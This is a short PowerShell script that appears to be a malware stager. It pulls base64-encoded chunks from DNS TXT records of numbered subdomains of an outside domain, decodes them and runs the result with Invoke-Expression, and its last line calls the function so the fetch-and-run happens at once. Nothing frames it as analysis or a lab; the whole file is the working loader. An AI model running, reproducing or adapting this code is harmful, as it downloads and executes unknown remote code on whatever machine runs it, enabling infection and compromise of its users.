function Get-ruta {
  $b64=""; (1..4) | ForEach-Object { $b64+=(nslookup -q=txt "$_.m4n4apmedia.com")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
}
function Get-ruta2 {
  $b64=""; (1..4) | ForEach-Object { $b64+=(nslookup -q=txt "$_.m4n4apmedia.com" jen.ns.cloudflare.com)[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
}
Get-ruta2
